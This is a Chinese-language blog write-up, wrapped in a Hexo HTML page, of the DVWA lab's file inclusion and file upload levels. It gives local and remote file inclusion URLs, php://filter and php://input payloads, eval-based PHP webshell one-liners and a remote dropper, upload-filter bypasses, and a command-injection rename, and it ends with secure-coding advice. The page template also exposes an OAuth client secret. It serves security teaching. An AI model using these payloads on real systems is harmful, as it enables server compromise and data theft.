@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      DVWA_(FILE inclusion&amp;uploads) | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>DVWA_(FILE inclusion&uploads)</h2>
+  <p class="post-date">2018-12-28 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>allow_url_include=On<br>allow_url_open=On(远程包含)</p>
+<blockquote>
+<blockquote>
+<blockquote>
+</blockquote>
+<p>服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p>
+<blockquote>
+</blockquote>
+</blockquote>
+</blockquote>
+<h2 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h2><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> &#x2F;&#x2F; The page we wish to display </span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ]; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>未对传入的page文件进行任何的过滤<br>本地包含:<br>构造<code>http://127.0.0.1/zlzhidao/vulnerabilities/fi/?page=\etc\shadow</code>判断是否为linux系统</p>
+<p><img src="./1.png" alt=""></p>
+<p>报错显示为windows系统，使用绝对路径访问php.ini文件<br><code>http://127.0.0.1/zlzhidao/vulnerabilities/fi/?page=F:\phpstudy\PHPTutorial\WWW\zlzhidao\php.ini</code></p>
+<p><img src="./2.png" alt=""></p>
+<p>相对路径访问php.ini<br><code>http://127.0.0.1/zlzhidao/vulnerabilities/fi/?page=../../../zlzhidao/php.ini</code><br><img src="./3.png" alt=""></p>
+<h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。<br>在远程服务器<code>192.168.43.195</code>上传一个<code>phpinfo.txt</code>文件，会以PHP解析在服务端打开。<br><a href="http://127.0.0.1/zlzhidao/vulnerabilities/fi/?page=http://127.0.0.1/phpinfo.txt" target="_blank" rel="noopener">http://127.0.0.1/zlzhidao/vulnerabilities/fi/?page=http://127.0.0.1/phpinfo.txt</a><br><img src="./4.png" alt=""></p>
+<p>打开百度链接<br><code>http://127.0.0.1/zlzhidao/vulnerabilities/fi/?page=http://www.baidu.com</code><br><img src="./5.png" alt=""></p>
+<h2 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Thepagewewishtodisplay</span><br><span class="line">$file&#x3D;$_GET[&#39;page&#39;];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Inputvalidation</span><br><span class="line">$file&#x3D;str_replace(array(&quot;http:&#x2F;&#x2F;&quot;,&quot;https:&#x2F;&#x2F;&quot;),&quot;&quot;,$file);</span><br><span class="line">$file&#x3D;str_replace(array(&quot;..&#x2F;&quot;,&quot;..\&quot;&quot;),&quot;&quot;,$file);</span><br><span class="line"></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+<p>服务端对<code>http:// ”、”https://”、 ” ../”、”..\”</code>替换为空字符，即删除。采用双写绕过或大小写混写就可以了。</p>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Thepagewewishtodisplay</span><br><span class="line">$file&#x3D;$_GET[&#39;page&#39;];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Inputvalidation</span><br><span class="line">if(!fnmatch(&quot;file*&quot;,$file)&amp;&amp;$file!&#x3D;&quot;include.php&quot;)&#123;</span><br><span class="line">   &#x2F;&#x2F;Thisisn&#39;tthepagewewant!</span><br><span class="line">echo&quot;ERROR:Filenotfound!&quot;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到源码对文件开头做了限制，必须时FILE开头<br>使用系统自带file://协议打开文件</p>
+<blockquote>
+<blockquote>
+<p><code>http://127.0.0.1/zlzhidao/vulnerabilities/fi/?page=file://F:\phpstudy\PHPTutorial\WWW\zlzhidao\php.ini</code></p>
+</blockquote>
+</blockquote>
+<p><img src="./6.png" alt=""></p>
+<h3 id="php-filter-伪协议使用"><a href="#php-filter-伪协议使用" class="headerlink" title="php://filter 伪协议使用"></a>php://filter 伪协议使用</h3><p>php://filter<br>读取文件并以base64编码返回<br>利用条件:无<br>常用payload</p>
+<blockquote>
+<blockquote>
+<p>php://filter/read=convert.base64-encode/resource=index.php</p>
+</blockquote>
+</blockquote>
+<p><img src="./7.png" alt=""></p>
+<h1 id="File-Inlcusion"><a href="#File-Inlcusion" class="headerlink" title="File Inlcusion"></a>File Inlcusion</h1><blockquote>
+<blockquote>
+<blockquote>
+</blockquote>
+<p>1、./是当前目录<br>2、../是父级目录<br>3、/是根目录</p>
+<blockquote>
+</blockquote>
+</blockquote>
+</blockquote>
+<h2 id="LOW-1"><a href="#LOW-1" class="headerlink" title="LOW"></a>LOW</h2><p>通过代码可看出未对文件上传做任何限制，直接上传带有一句话木马的PHP文件<br><img src="./8.png" alt=""></p>
+<h2 id="MEDIUM-1"><a href="#MEDIUM-1" class="headerlink" title="MEDIUM"></a>MEDIUM</h2><p><img src="./9.png" alt=""><br>发现源代码对文件上传的后缀名做了限制<br>直接上传带有一句话木马的png图片<br><img src="./10.png" alt=""></p>
+<h3 id="扯到了菜刀原理"><a href="#扯到了菜刀原理" class="headerlink" title="扯到了菜刀原理"></a>扯到了菜刀原理</h3><p>上传成功，使用菜刀连接。显示连接失败<br>中国菜刀的原理是向上传文件发送包含123参数的post请求，通过控制123参数来执行不同的命令，而这里服务器将木马文件解析成了图片文件，因此向其发送post请求时，服务器只会返回这个“图片”文件，并不会执行相应命令。//</p>
+<h3 id="解决方案-分析源码"><a href="#解决方案-分析源码" class="headerlink" title="解决方案(分析源码)"></a>解决方案(分析源码)</h3><p>啰嗦这么多原因就是<br>由于服务器解析成图片无法执行post命令<br>使用burpsuite抓包改，上传*。png文件，将后缀名改位php上传<br>//原理分析，在加载网页时候，php脚本已经加载完在浏览器中，当点击UPLOAD浏览器执行PHP脚本判断文件类型，但是burpsuite截取的是发送的http请求。所以这里burpsuite抓包显示已经对文件类型做出了判断为png。<br><img src="./11.png" alt=""><br><img src="./12.png" alt=""></p>
+<h2 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h2><p>high代码通过if条件语句判断文件后缀名+grtmagesize()限制上传文件内容的文件头必须带有图片后缀名才能上传成功<br>通过windows自带的<code>copy</code>命令将php文件与png图片合成</p>
+<h3 id="使用burpsuite无法修改后缀为php解决方案"><a href="#使用burpsuite无法修改后缀为php解决方案" class="headerlink" title="使用burpsuite无法修改后缀为php解决方案"></a>使用burpsuite无法修改后缀为php解决方案</h3><p>通过<code>burpsuite</code>截取改后缀名时无法成功，在服务端直接对文件后缀名判断。而<code>medium</code>只是对<code>content-type</code>做出了判断。<br><img src="./13.png" alt=""></p>
+<p><img src="./14.png" alt=""></p>
+<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>使用HIGH下的<code>COMMAND Injection</code><br><code>|dir</code>得出文件路径,结合uploads 时的路径提示</p>
+<blockquote>
+<blockquote>
+<p><code>F:\phpstudy\PHPTutorial\WWW\zlzhidao\vulnerabilities\hackable\uploads\new1.png</code></p>
+</blockquote>
+</blockquote>
+<p>修改后缀名命令</p>
+<blockquote>
+<blockquote>
+<p><code>127.0.0.1|  |rename ..\\..\\hackable\\uploads\\new1.png new1.php</code></p>
+</blockquote>
+</blockquote>
+<p><img src="./15.png" alt=""></p>
+<p>修改成功 使用菜刀连接<br><img src="./16.png" alt=""><br><img src="./17.png" alt=""></p>
+<h1 id="PHP文件包含利用"><a href="#PHP文件包含利用" class="headerlink" title="PHP文件包含利用"></a>PHP文件包含利用</h1><h2 id="读取敏感文件"><a href="#读取敏感文件" class="headerlink" title="读取敏感文件"></a>读取敏感文件</h2><p>访问url: <code>http://www.123.com/index.php?page=/etc/passwd</code>，存在若有相应权限读出文件内容。反之得出：<code>open_basedir restriction in effect</code>警告<br>常见敏感信息如下：<br><img src="./18.png" alt=""></p>
+<h2 id="远程包含shell"><a href="#远程包含shell" class="headerlink" title="远程包含shell"></a>远程包含shell</h2><p>条件：<code>allow_url_fopen</code>选项是激活的</p>
+<ol>
+<li>远程木马存在地址<code>http://www.example.com/echo.txt</code><br><strong>文件内容<code>&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[&#39;mima&#39;]);?&gt;&quot;)?&gt;</code></strong></li>
+</ol>
+<ol start="2">
+<li>执行url：<code>http://www.123.com/index.php?page=http://www.example.com/echo.txt</code><br><strong>写入一句话木马<code>&lt;?php eval($_POST[&#39;mima&#39;]);?&gt;</code></strong></li>
+</ol>
+<h2 id="本地包含配合文件上传"><a href="#本地包含配合文件上传" class="headerlink" title="本地包含配合文件上传"></a>本地包含配合文件上传</h2><p>上传文件后，使用文件包含漏洞访问。这里就不赘述了。 </p>
+<h2 id="PHP封装协议"><a href="#PHP封装协议" class="headerlink" title="PHP封装协议"></a>PHP封装协议</h2><p>PHP内置协议如图，与<code>fopen(),copy(),file_exists(),filesize()</code>等文件系统函数所提供功能相似<br><img src="./19.png" alt=""></p>
+<ol>
+<li><p>封装协议读取PHP文件<br><code>http://www.123.com/index.php?page=php://filter/read=convert.base64-encode/resource=config.php</code><br>上文试题也有详细操作，就不赘述了。</p>
+</li>
+<li><p>写入PHP文件<br>使用 <code>php://input</code><br>条件：<code>allow_url_include()</code> 为 <code>On</code><br>URL:<code>http://192.168.43.195/DVWA/vulnerabilities/fi/?page=php://input</code><br><code>&lt;?php system(&#39;net user&#39;);?&gt;</code><br><img src="./20.png" alt=""></p>
+</li>
+</ol>
+<p>使用写入一句话木马也是可以 得使用<code>fputs</code>和 <code>fopen</code>函数</p>
+<h2 id="包含Apache日志文件"><a href="#包含Apache日志文件" class="headerlink" title="包含Apache日志文件"></a>包含Apache日志文件</h2><p>访问<code>http://www.123.com/&lt;?php phpinfo() ?&gt;</code> 使用<code>burpsuite HTTP</code>编辑器发送，就不会被浏览器转义。已知日志路径就能访问一句话木马了。</p>
+<h2 id="截断包含"><a href="#截断包含" class="headerlink" title="截断包含"></a>截断包含</h2><p>在图片路径后加上%00 会以PHP方式解析<br>条件：<code>magic_qutotes_gpc = Off</code><br>为ON 转义 <code>&#39;、&quot;、\、NULL</code></p>
+<h1 id="安全编写包含"><a href="#安全编写包含" class="headerlink" title="安全编写包含"></a>安全编写包含</h1><p>造成包含漏洞原因是被包含页面可控</p>
+<ul>
+<li><strong>参数可被控制</strong></li>
+<li><strong>路径限制，禁止目录跳转字符”../“</strong></li>
+<li><strong>包含文件验证：验证是否是白名单中的参数</strong></li>
+<li><strong>尽量不使用动态包含，写死网页 include(“head.php”)</strong></li>
+</ul>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#LFI" >
+    <span class="tag-code">LFI</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2018/12/27/DVWA-CSRF/">
+        <span class="nav-arrow">← </span>
+        
+          DVWA_CSRF
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2018/12/28/DVWA-XSS/">
+        
+          DVWA_XSS
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#File-Inclusion"><span class="toc-nav-text">File Inclusion</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#前言"><span class="toc-nav-text">前言</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#LOW"><span class="toc-nav-text">LOW</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#本地包含"><span class="toc-nav-text">本地包含</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#远程包含"><span class="toc-nav-text">远程包含</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#MEDIUM"><span class="toc-nav-text">MEDIUM</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#High"><span class="toc-nav-text">High</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#php-filter-伪协议使用"><span class="toc-nav-text">php:&#x2F;&#x2F;filter 伪协议使用</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#File-Inlcusion"><span class="toc-nav-text">File Inlcusion</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#LOW-1"><span class="toc-nav-text">LOW</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#MEDIUM-1"><span class="toc-nav-text">MEDIUM</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#扯到了菜刀原理"><span class="toc-nav-text">扯到了菜刀原理</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#解决方案-分析源码"><span class="toc-nav-text">解决方案(分析源码)</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#HIGH"><span class="toc-nav-text">HIGH</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#使用burpsuite无法修改后缀为php解决方案"><span class="toc-nav-text">使用burpsuite无法修改后缀为php解决方案</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#解决方案"><span class="toc-nav-text">解决方案</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#PHP文件包含利用"><span class="toc-nav-text">PHP文件包含利用</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#读取敏感文件"><span class="toc-nav-text">读取敏感文件</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#远程包含shell"><span class="toc-nav-text">远程包含shell</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#本地包含配合文件上传"><span class="toc-nav-text">本地包含配合文件上传</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#PHP封装协议"><span class="toc-nav-text">PHP封装协议</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#包含Apache日志文件"><span class="toc-nav-text">包含Apache日志文件</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#截断包含"><span class="toc-nav-text">截断包含</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#安全编写包含"><span class="toc-nav-text">安全编写包含</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2018/12/28/DVWA-FILE-inclusion-uploads/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "DVWA_(FILE inclusion&uploads)",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
